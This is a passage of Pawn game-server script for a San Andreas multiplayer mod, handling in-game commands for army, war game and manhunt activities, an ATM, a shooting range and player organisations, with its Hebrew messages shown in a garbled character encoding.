				SendClientMessage(playerid,white," /army end :Army Game ётщ°· ЇЄщьх·");
			}
			SendClientMessage(playerid,white," /army types :Army Game °∙щю· ёхтщ ЇЄщьхщх·");
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(armyinfo[0])
			{
				if(armyinfo[2] > 1)
				{
					format(string,sizeof(string)," .фў°с щ·чщь сЄху ,Army Game щ∙ ыЄ· ·ч°х· %d ∙Ёщх·",armyinfo[2]);
					SendClientMessage(playerid,green,string);
				}
				else SendClientMessage(playerid,green," .хфў°с ыс° ф·чщь Army Game щ∙ ыЄ· ·ч°х·");
			}
			else SendClientMessage(playerid,red," .Army Game рщя ыЄ· ·ч°х·");
		}
		else if(equal(cmd,"join"))
		{
			if(!armyinfo[0]) return SendClientMessage(playerid,red," .ы°тЄ Army Game рщя ·ч°х·");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][waitarmy]) return SendClientMessage(playerid,red," .··чщь сЄху ыюф ∙Ёщх·, рЁр фю·я сёсьЁх· Army Game ·ч°х· ф");
			if(playerinfo[playerid][inarmy]) return SendClientMessage(playerid,red," .Army Game р·ф ыс° с·ч°х· ф");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф срцх° ущ-рэ");
			if(!CanUseCommand(playerid)) return 1;
			if(armyinfo[1] >= sizeof(ArmyPositions)) return SendClientMessage(playerid,red," .·Їхёщэ Army Game ыь фюўхюх· с·ч°х· ф");
			if(armyinfo[2] <= 3) return SendClientMessage(playerid,red," .цюя ффЎш°Їх· Єс°");
			if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхї ь°ыс");
			if(GetMoney(playerid) < join_act) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, фючщ° ьфЎш°Їх· ьЇЄщьх· фхр " #join_act "$");
			GiveMoney(playerid,0-join_act,25);
			ResetWeapons(playerid);
			playerinfo[playerid][waitarmy] = 1;
			playerinfo[playerid][armyv] = CreateVehicleEx(army[armyinfo[4]-1][arVID] == -1 ? army[randomEx(0,sizeof(army)-1)][arVID] : army[armyinfo[4]-1][arVID],ArmyPositions[armyinfo[1]][0],ArmyPositions[armyinfo[1]][1],ArmyPositions[armyinfo[1]][2],ArmyPositions[armyinfo[1]][3],-1,-1,respawntime,0,world_army);
			armyinfo[1]++;
			SendClientMessage(playerid,lightblue," Х Х :Army Game фЎш°Ї· ьЇЄщьх· Х Х");
			SendClientMessage(playerid,green," - юш°·ъ фщр ьф∙·ю∙ с°ыс фЎсрщ ∙·ўсь Єь юЁ· ьЁёх· ьЇхЎї р· ыхьэ");
			SendClientMessage(playerid,green," - фрч°хя ∙Ё∙р° чщщ, юЁЎч");
			SendClientMessage(playerid,green," - !∙щэ ьс ыщ рёх° ьЎр· юрцх° фЎср");
			format(string,sizeof(string)," Х фщЁъ ю·ч°ф юёЇ° " @c(white) "#%d",armyinfo[1]);
			SendClientMessage(playerid,yellow,string);
			SendClientMessage(playerid,purple," ╗ !сфЎьчф");
		}
		else if(equal(cmd,"quit"))
		{
			if(!armyinfo[0]) return SendClientMessage(playerid,red," .ы°тЄ Army Game рщя ·ч°х·");
			if(!playerinfo[playerid][inarmy]) return SendClientMessage(playerid,red," .Army Game р·ф ьр с·ч°х· ф");
			SendClientMessage(playerid,green," .Army Game Ї°∙· ю·ч°х· ф");
			OutOfActivity(playerid);
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			#endif
			if(armyinfo[0]) return SendClientMessage(playerid,red," .Army Game ыс° щ∙ ·ч°х·");
			if(thereIsAct) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ЇхЄь·");
			cmd = strtok(cmdtext,idx);
			new t = !strlen(cmd) ? randomEx(1,sizeof(army)+1) : strval(cmd);
			if(t < 1 || t > sizeof(army)) return SendClientMessage(playerid,red," .∙тхщф Army Game ёхт ЇЄщьх·");
			StartArmy(t);
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			if(!armyinfo[0]) return SendClientMessage(playerid,red," .ы°тЄ Army Game рщя ·ч°х·");
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = "рщя";
			EndArmy(reason,playerid);
		}
		else if(equal(cmd,"types"))
		{
			SendClientMessage(playerid,lightblue," ~~~ :Army Game ёхтщ ~~~");
			for(new i = 0; i < sizeof(army); i++)
			{
				format(string,sizeof(string)," Х %d - %s",i + 1,army[i][arName]);
				SendClientMessage(playerid,yellow,string);
			}
		}
		else SendClientMessage(playerid,red," .∙тхщф Army Game рЇ∙°х· ·ч°х·");
		return 1;
	}
	for(new i = 0; i < sizeof(warGames); i++) if(equal(cmd,warGames[i][wgCommand]))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			format(string,sizeof(string)," %s [action] :Ўх°ъ ф∙щюх∙",warGames[i][wgCommand]);
			SendClientMessage(playerid,white,string);
			format(string,sizeof(string)," %s state :фЁхычщ· %s сущў· юЎс ЇЄщьх· ф",warGames[i][wgCommand],warGames[i][wgName]);
			SendClientMessage(playerid,white,string);
			format(string,sizeof(string)," %s join :%s фЎш°Їх· ь",warGames[i][wgCommand],warGames[i][wgName]);
			SendClientMessage(playerid,white,string);
			format(string,sizeof(string)," %s quit :%s Ї°щ∙ф ю",warGames[i][wgCommand],warGames[i][wgName]);
			SendClientMessage(playerid,white,string);
			if(IsPlayerMAdmin(playerid))
			{
				format(string,sizeof(string)," %s start :%s ф·чь· ЇЄщьх·",warGames[i][wgCommand],warGames[i][wgName]);
				SendClientMessage(playerid,white,string);
				format(string,sizeof(string)," %s end [reason] :фЁхычщ· %s ёщхэ ЇЄщьх· ф",warGames[i][wgCommand],warGames[i][wgName]);
				SendClientMessage(playerid,white,string);
			}
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(wargameinfo[0] && wargameinfo[4] == i)
				if(wargameinfo[2] > 1) format(string,sizeof(string)," .хфщр ··чщь сЄху %d ∙Ёщх· %s щ∙ ы°тЄ ЇЄщьх·",wargameinfo[2],warGames[i][wgName]);
				else format(string,sizeof(string)," .хфщр ыс° ф·чщьф %s щ∙ ы°тЄ ЇЄщьх·",warGames[i][wgName]);
			else format(string,sizeof(string)," .%s рщя ы°тЄ ЇЄщьх·",warGames[i][wgName]);
			SendClientMessage(playerid,wargameinfo[0] ? green : red,string);
		}
		else if(equal(cmd,"join"))
		{
			if(!wargameinfo[0] || wargameinfo[4] != i)
			{
				format(string,sizeof(string)," .ы°тЄ %s рщя ЇЄщьх·",warGames[i][wgName]);
				return SendClientMessage(playerid,red,string);
			}
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][waitwargame]) return SendClientMessage(playerid,red," .фЇЄщьх· ··чщь сЄху ыюф ∙Ёщх·, рЁр фю·я сёсьЁх·");
			if(playerinfo[playerid][inwargame] && wargameinfo[4] == i)
			{
				format(string,sizeof(string)," .%s р·ф ыс° сЇЄщьх·",warGames[i][wgName]);
				return SendClientMessage(playerid,red,string);
			}
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф срцх° ущ-рэ");
			if(!CanUseCommand(playerid)) return 1;
			if(wargameinfo[1] >= MAX_ACTIVITY_PLAYERS)
			{
				format(string,sizeof(string)," .·Їхёщэ %s ыь фюўхюх· с",warGames[i][wgName]);
				return SendClientMessage(playerid,red,string);
			}
			if(wargameinfo[2] <= 3) return SendClientMessage(playerid,red," .цюя ффЎш°Їх· Єс°");
			if(GetMoney(playerid) < join_act) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, фючщ° ьфЎш°Їх· ьЇЄщьх· фхр " #join_act "$");
			GiveMoney(playerid,0-join_act,25);
			playerinfo[playerid][waitwargame] = 1;
			wargameinfo[1]++;
			format(string,sizeof(string)," Х Х :%s фЎш°Ї· ьЇЄщьх· Х Х",warGames[i][wgName]);
			SendClientMessage(playerid,lightblue,string);
			SendClientMessage(playerid,darkred," - юш°·ъ фщр ьЁЎч р· ыь фщ°щсщэ сЇЄщьх· Єь юЁ· ьф∙р° рч°хя");
			SendClientMessage(playerid,darkred," - ф∙·ю∙ сфщтщхя хсц°щцх· ыущ ьф·чюў рх ь·ўхє сф·рэ");
			SendClientMessage(playerid,red," - /WTypes :ыурщ ∙·сч° Ё∙ўщэ ∙юхЄуЇщэ Єьщъ, щ·ыя хщфщф сфэ ∙щюх∙ сў°с");
			format(string,sizeof(string)," Х фщЁъ ю·ч°ф юёЇ° " @c(white) "#%d",wargameinfo[1]);
			SendClientMessage(playerid,yellow,string);
			SendClientMessage(playerid,purple," ╗ !сфЎьчф");
		}
		else if(equal(cmd,"quit"))
		{
			if(!wargameinfo[0] || wargameinfo[4] != i)
			{
				format(string,sizeof(string)," .ы°тЄ %s рщя ЇЄщьх·",warGames[i][wgName]);
				return SendClientMessage(playerid,red,string);
			}
			if(!playerinfo[playerid][inwargame])
			{
				format(string,sizeof(string)," .%s р·ф ьр сЇЄщьх·",warGames[i][wgName]);
				return SendClientMessage(playerid,red,string);
			}
			format(string,sizeof(string)," .%s Ї°∙· юфЇЄщьх·",warGames[i][wgName]);
			SendClientMessage(playerid,green,string);
			OutOfActivity(playerid);
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			#endif
			if(wargameinfo[0] && wargameinfo[4] == i)
			{
				format(string,sizeof(string)," .%s ыс° щ∙ ЇЄщьх· юёхт",warGames[i][wgName]);
				return SendClientMessage(playerid,red,string);
			}
			if(thereIsAct) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ЇхЄь·");
			StartWarGame(i);
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			if(!wargameinfo[0] || wargameinfo[4] != i)
			{
				format(string,sizeof(string)," .%s рщя ы°тЄ ЇЄщьх· юёхт",warGames[i][wgName]);
				return SendClientMessage(playerid,red,string);
			}
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = "рщя";
			EndWarGame(reason,playerid);
		}
		else
		{
			format(string,sizeof(string)," .∙тхщф %s рЇ∙°х·",warGames[i][wgName]);
			SendClientMessage(playerid,red,string);
		}
		return 1;
	}
	for(new i = 0; i < sizeof(ManhuntTypes); i++) if(equal(cmd,ManhuntTypes[i][mhCommand]))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			format(string,sizeof(string)," %s [action] :Ўх°ъ ф∙щюх∙",ManhuntTypes[i][mhCommand]);
			SendClientMessage(playerid,white,string);
			format(string,sizeof(string)," %s state :фЁхычщ· %s сущў· юЎс ЇЄщьх· ф",ManhuntTypes[i][mhCommand],ManhuntTypes[i][mhName]);
			SendClientMessage(playerid,white,string);
			format(string,sizeof(string)," %s join :%s фЎш°Їх· ь",ManhuntTypes[i][mhCommand],ManhuntTypes[i][mhName]);
			SendClientMessage(playerid,white,string);
			format(string,sizeof(string)," %s quit :%s Ї°щ∙ф ю",ManhuntTypes[i][mhCommand],ManhuntTypes[i][mhName]);
			SendClientMessage(playerid,white,string);
			if(IsPlayerMAdmin(playerid))
			{
				format(string,sizeof(string)," %s start :%s ф·чь· ЇЄщьх·",ManhuntTypes[i][mhCommand],ManhuntTypes[i][mhName]);
				SendClientMessage(playerid,white,string);
				format(string,sizeof(string)," %s end [reason] :фЁхычщ· %s ёщхэ ЇЄщьх· ф",ManhuntTypes[i][mhCommand],ManhuntTypes[i][mhName]);
				SendClientMessage(playerid,white,string);
			}
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(manhuntinfo[0] && manhuntinfo[4] == i)
				if(manhuntinfo[2] > 1) format(string,sizeof(string)," .хфщр ··чщь сЄху %d ∙Ёщх· %s щ∙ ы°тЄ ЇЄщьх·",manhuntinfo[2],ManhuntTypes[i][mhName]);
				else format(string,sizeof(string)," .хфщр ыс° ф·чщьф %s щ∙ ы°тЄ ЇЄщьх·",ManhuntTypes[i][mhName]);
			else format(string,sizeof(string)," .%s рщя ы°тЄ ЇЄщьх·",ManhuntTypes[i][mhName]);
			SendClientMessage(playerid,manhuntinfo[0] ? green : red,string);
		}
		else if(equal(cmd,"join"))
		{
			if(!manhuntinfo[0] || manhuntinfo[4] != i)
			{
				format(string,sizeof(string)," .ы°тЄ %s рщя ЇЄщьх·",ManhuntTypes[i][mhName]);
				return SendClientMessage(playerid,red,string);
			}
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][waitmanhunt]) return SendClientMessage(playerid,red," .фЇЄщьх· ··чщь сЄху ыюф ∙Ёщх·, рЁр фю·я сёсьЁх·");
			if(playerinfo[playerid][inmanhunt] && manhuntinfo[4] == i)
			{
				format(string,sizeof(string)," .%s р·ф ыс° сЇЄщьх·",ManhuntTypes[i][mhName]);
				return SendClientMessage(playerid,red,string);
			}
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф срцх° ущ-рэ");
			if(!CanUseCommand(playerid)) return 1;
			if(manhuntinfo[1] >= GetManhuntMaxPlayers())
			{
				format(string,sizeof(string)," .·Їхёщэ %s ыь фюўхюх· с",ManhuntTypes[i][mhName]);
				return SendClientMessage(playerid,red,string);
			}
			if(manhuntinfo[2] <= 3) return SendClientMessage(playerid,red," .цюя ффЎш°Їх· Єс°");
			if(GetMoney(playerid) < join_act) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, фючщ° ьфЎш°Їх· ьЇЄщьх· фхр " #join_act "$");
			GiveMoney(playerid,0-join_act,25);
			playerinfo[playerid][waitmanhunt] = 1;
			manhuntinfo[1]++;
			playerinfo[playerid][manhuntid] = manhuntinfo[1];
			format(string,sizeof(string)," Х Х :%s фЎш°Ї· ьЇЄщьх· Х Х",ManhuntTypes[i][mhName]);
			SendClientMessage(playerid,lightblue,string);
			SendClientMessage(playerid,lightblue," - сЇЄщьх· цр· ∙чўя рчу щсч° с·х° ЁщЎху, ∙р° ф∙чўЁщэ щьчюх Ётух ыўсхЎф");
			SendClientMessage(playerid,lightblue," - рэ ·сч° с·х° ЁщЎху: Єьщъ ьф°хт р· ыь ф∙чўЁщэ ∙р·ф °хрф");
			SendClientMessage(playerid,lightblue," - рэ ·сч° с·х° Ўщщу: Єьщъ ьф°хт р· ф∙чўя фЁщЎху сщчу Єэ ∙р° ф∙чўЁщэ");
			format(string,sizeof(string)," Х фщЁъ ю·ч°ф юёЇ° " @c(white) "#%d",manhuntinfo[1]);
			SendClientMessage(playerid,yellow,string);
			SendClientMessage(playerid,purple," ╗ !сфЎьчф");
		}
		else if(equal(cmd,"quit"))
		{
			if(!manhuntinfo[0] || manhuntinfo[4] != i)
			{
				format(string,sizeof(string)," .ы°тЄ %s рщя ЇЄщьх·",ManhuntTypes[i][mhName]);
				return SendClientMessage(playerid,red,string);
			}
			if(!playerinfo[playerid][inmanhunt])
			{
				format(string,sizeof(string)," .%s р·ф ьр сЇЄщьх·",ManhuntTypes[i][mhName]);
				return SendClientMessage(playerid,red,string);
			}
			format(string,sizeof(string)," .%s Ї°∙· юфЇЄщьх·",ManhuntTypes[i][mhName]);
			SendClientMessage(playerid,green,string);
			OutOfActivity(playerid);
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			#endif
			if(manhuntinfo[0] && manhuntinfo[4] == i)
			{
				format(string,sizeof(string)," .%s ыс° щ∙ ЇЄщьх· юёхт",ManhuntTypes[i][mhName]);
				return SendClientMessage(playerid,red,string);
			}
			if(thereIsAct) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ЇхЄь·");
			StartManhunt(i);
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			if(!manhuntinfo[0] || manhuntinfo[4] != i)
			{
				format(string,sizeof(string)," .%s рщя ы°тЄ ЇЄщьх· юёхт",ManhuntTypes[i][mhName]);
				return SendClientMessage(playerid,red,string);
			}
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = "рщя";
			EndManhunt(reason,playerid);
		}
		else
		{
			format(string,sizeof(string)," .∙тхщф %s рЇ∙°х·",ManhuntTypes[i][mhName]);
			SendClientMessage(playerid,red,string);
		}
		return 1;
	}
	if(equal(cmd,"/atm"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_atm || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сыёЇхюш сыущ ьсЎЄ Їўхуф цх");
		ShowPlayerDialog(playerid,dialog_atm,DIALOG_STYLE_LIST," рЇ∙°хщх· ыёЇхюш","фхЎр ыёє\nфхЎр р· ыь фыёє юч∙схя фсЁў\nсухў р· юрця ч∙схя фсЁў","сч°","ётх°");
		return 1;
	}
	if(equal(cmd,"/srstart"))
	{
		if(GetPlayerInterior(playerid) != 4 || !playerinfo[playerid][srin] || GetPlayerVirtualWorld(playerid) < world_count) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сюшххч фщ°щх· ь∙щюх∙ сЇўхуф цх");
		if(playerinfo[playerid][srstarted]) return SendClientMessage(playerid,red," .фюшххч ыс° ЇхЄь");
		new Float:p[3], string[M_S];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		if(IsPlayerInArea(playerid,304.2021,-56.6648,331.8717,-71.9615) || p[2] > 1001.5158) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф·чщь р· фюшххч ююўхэ цф");
		playerinfo[playerid][srstarted] = 1, playerinfo[playerid][srseconds] = 3, playerinfo[playerid][srscore] = 0, playerinfo[playerid][srtotal] = 0;
		SetTimerPck(playerinfo[playerid][srtimer],"ShootingRangeTimer",1000,1,"ii",playerid,1);
		format(string,sizeof(string)," ...щ·чщь сЄху 3 ∙Ёщх· %s юшххч с°юф %d Єэ фЁ∙ў",WeaponName(playerinfo[playerid][srweapon]),playerinfo[playerid][srlevel]);
		SendClientMessage(playerid,green,string);
		SetFreeze(playerid,1);
		return 1;
	}
	if(equal(cmd,"/srstop"))
	{
		if(GetPlayerInterior(playerid) != 4 || !playerinfo[playerid][srin] || GetPlayerVirtualWorld(playerid) < world_count) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сюшххч фщ°щх· ь∙щюх∙ сЇўхуф цх");
		if(!playerinfo[playerid][srstarted]) return SendClientMessage(playerid,red," .фюшххч ьр ЇхЄь");
		SendClientMessage(playerid,green," .фЇёў· р· фюшххч");
		StopShootingRange(playerid);
		ResetWeapons(playerid);
		LoadPlayerWeapons(playerid);
		SetPlayerPos(playerid,298.3959,-74.4127,1001.5156);
		SetPlayerFacingAngle(playerid,359.0325);
		SetCameraBehindPlayer(playerid);
		return 1;
	}
	if(equal(cmd,"/srlevel"))
	{
		if(GetPlayerInterior(playerid) != 4 || !playerinfo[playerid][srin] || GetPlayerVirtualWorld(playerid) < world_count) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сюшххч фщ°щх· ь∙щюх∙ сЇўхуф цх");
		if(playerinfo[playerid][srstarted]) return SendClientMessage(playerid,red," .ьр Ёщ·я ь∙Ёх· р· ф°юф ьрч° ∙фюшххч ф·чщь");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /srlevel [1-3] :Ўх°· ф∙щюх∙");
		new lvl = strval(cmd), string[M_S];
		if(lvl < 1 || lvl > 3) return SendClientMessage(playerid,red," .ф°юф щыхьф ьфщх· °ў сщя 1 ь 3");
		playerinfo[playerid][srlevel] = lvl;
		format(string,sizeof(string)," .°ю· фўх∙щ ∙ь юшххч фщ°щх· фхту°ф ы %d",lvl);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/sclist"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :°∙щю· ф∙щЇх°щэ фющхчущэ ~~~");
		new id = 0, string[M_S];
		for(new i = 0; i < 12; i++) if(sgarageinfo[i][gcValid])
		{
			id++;
			format(string,sizeof(string)," Х %d) %s ($%d) - %s",id,sgarageinfo[i][gcName],sgarageinfo[i][gcCost],sgarageinfo[i][gcText]);
			SendClientMessage(playerid,yellow,string);
		}
		return 1;
	}
	if(equal(cmd,"/org"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /org [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /Mode 81 - ь°∙щю· Їўхух· фр°тхЁщэ");
			return 1;
		}
		if(equal(cmd,"invite"))
		{
			if(!playerinfo[playerid][invitetime][0]) return SendClientMessage(playerid,red," .·хыь ь∙ьхч фцюЁх· ∙хс сў°хс");
			if(playerinfo[playerid][org] == 0 || !orginfo[playerinfo[playerid][org]][orgvalid]) return SendClientMessage(playerid,red," .р·ф ьр ср°тхя °∙ющ");
			if(playerinfo[playerid][lorg] < 2) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· тщ∙х· 2");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /org invite [id/name] :Ўх°· ф∙щюх∙");
			new id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(id == playerid) return SendClientMessage(playerid,red," .рщЁъ щыхь ьфцющя р· ЄЎюъ");
			if(playerinfo[id][org] > 0)
			{
				format(string,sizeof(string)," .ыс° ЁюЎр ср°тхя %s",GetName(id));
				return SendClientMessage(playerid,red,string);
			}
			playerinfo[playerid][invitetime][0]--;
			format(string,sizeof(string)," .ьр°тхя %s фцюЁ· р·",GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," /accept :ьрщ∙х° ,\"%s\" ∙ьч ьъ фцюЁф ьр°тхя %s",orginfo[playerinfo[playerid][org]][oname],GetName(playerid));
			SendClientMessage(id,green,string);
			playerinfo[id][iorg] = playerinfo[playerid][org];
			playerinfo[id][lastrec] = 7;
		}
		else if(equal(cmd,"accept"))
		{
	 		if(playerinfo[playerid][iorg] == 0) return SendClientMessage(playerid,red," .ьр фхцюЁ· ь∙хэ р°тхя");
			if(playerinfo[playerid][org] != 0) return SendClientMessage(playerid,red," .р·ф ыс° ср°тхя");
			format(string,sizeof(string)," .фЎш°є ьр°тхя ∙ьъ %s",GetName(playerid));
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][org] == playerinfo[playerid][iorg]) SendClientMessage(i,green,string);
			playerinfo[playerid][org] = playerinfo[playerid][iorg], playerinfo[playerid][lorg] = 1;
			format(string,sizeof(string)," .\"%s\" фЎш°Ї· ьр°тхя",orginfo[playerinfo[playerid][org]][oname]);
			SendClientMessage(playerid,green,string);
			playerinfo[playerid][iorg] = 0;
			playerinfo[playerid][lastrec] = 0;
			if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Org",playerinfo[playerid][org]);
		}
		else if(equal(cmd,"cancel"))
		{
	 		if(playerinfo[playerid][iorg] == 0) return SendClientMessage(playerid,red," .ьр фхцюЁ· ь∙хэ р°тхя");
	 		format(string,sizeof(string)," .сщшь р· ффцюЁф ьфЎш°Їх· ьр°тхя ∙ьъ %s",GetName(playerid));
	 		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][org] == playerinfo[playerid][iorg]) SendClientMessage(i,green,string);
			format(string,sizeof(string)," .\"%s\" сщшь· р· ффцюЁф ьфЎш°Їх· ьр°тхя",orginfo[playerinfo[playerid][iorg]][oname]);
			SendClientMessage(playerid,green,string);
			playerinfo[playerid][iorg] = 0;
			playerinfo[playerid][lastrec] = 0;
		}
		else if(equal(cmd,"quit"))
		{
			if(playerinfo[playerid][org] == 0 || !orginfo[playerinfo[playerid][org]][orgvalid]) return SendClientMessage(playerid,red," .р·ф ьр ср°тхя °∙ющ");
			format(string,sizeof(string)," .\"%s\" щЎр· юфр°тхя",orginfo[playerinfo[playerid][org]][oname]);
			SendClientMessage(playerid,green,string);
			PlayerLeaveOrg(playerid);
		}
		else if(equal(cmd,"kick"))
		{
			if(playerinfo[playerid][org] == 0 || !orginfo[playerinfo[playerid][org]][orgvalid]) return SendClientMessage(playerid,red," .р·ф ьр ср°тхя °∙ющ");
			if(playerinfo[playerid][lorg] < 2) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· тщ∙х· 2");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /org kick [id/name] [reason] :Ўх°· ф∙щюх∙");
			new id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			cmd = strrest(cmdtext,idx);
			if(id == playerid) return SendClientMessage(playerid,red," .рщЁъ щыхь ьфхЎщр р· ЄЎюъ");
			if(playerinfo[id][org] != playerinfo[playerid][org])
			{
				format(string,sizeof(string)," .ьр ЁюЎр ср°тхя ∙ьъ %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			if(playerinfo[playerid][lorg] < playerinfo[id][lorg]) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьфЄщє юфр°тхя ∙чўя с°ю· тщ∙х· тсхфф ю∙ьъ");
			if(!strlen(cmd)) format(string,sizeof(string)," .%s фхЎщр юфр°тхя %s",GetName(id),GetName(playerid));
			else format(string,sizeof(string)," :юфёщсф %s фхЎщр юфр°тхя р· %s",GetName(id),GetName(playerid));
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][org] == playerinfo[playerid][org])
			{
				SendClientMessage(i,green,string);
				if(strlen(cmd) > 0) SendClientMessage(i,green,cmd);
			}
			format(string,sizeof(string)," .\"%s\" фхЎщр рх·ъ юфр°тхя %s",orginfo[playerinfo[playerid][org]][oname],GetName(playerid));
			SendClientMessage(id,red,string);
			PlayerLeaveOrg(id);
		}
		else if(equal(cmd,"setlevel"))
		{
			if(playerinfo[playerid][org] == 0 || !orginfo[playerinfo[playerid][org]][orgvalid]) return SendClientMessage(playerid,red," .р·ф ьр ср°тхя °∙ющ");
			if(playerinfo[playerid][lorg] < 3) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· тщ∙х· 3");
			new cmd2[M_S];
			cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
			if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2))
			{
				SendClientMessage(playerid,white," /org setlevel [id/name] [1-3] :Ўх°· ф∙щюх∙");
				SendClientMessage(playerid,lightblue," ~~~ :°ю· тщ∙х· ср°тхя ~~~");
				SendClientMessage(playerid,orange," Х Level 1 (Player): рщя тщ∙х· ющхчух·");
				SendClientMessage(playerid,orange," Х Level 2 (Leader): тщ∙ф ьЎ°є хьфхЎщр ∙чўЁщэ + ьЄ°хъ р· ф∙щтх° ьюЇўуф");
				SendClientMessage(playerid,orange," Х Level 3 (Founder): тщ∙ф ь∙щэ ь∙р° чс°щ фр°тхя тщ∙х· ∙хЁх·; тщ∙х· юьрх·");
